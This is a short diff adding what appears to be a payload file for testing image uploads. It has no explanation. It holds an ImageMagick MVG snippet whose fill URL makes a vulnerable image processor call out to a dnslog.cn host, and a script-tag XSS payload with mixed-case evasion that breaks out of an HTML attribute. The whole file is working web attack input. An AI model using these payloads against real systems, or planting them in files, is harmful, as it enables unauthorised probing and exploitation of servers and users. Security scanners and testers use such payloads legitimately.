@@ -1,0 +1,5 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(http://01fyh6.dnslog.cn/)'
+pop graphic-context
+"><sCrIpt>alert("XsS")</scRiPt>
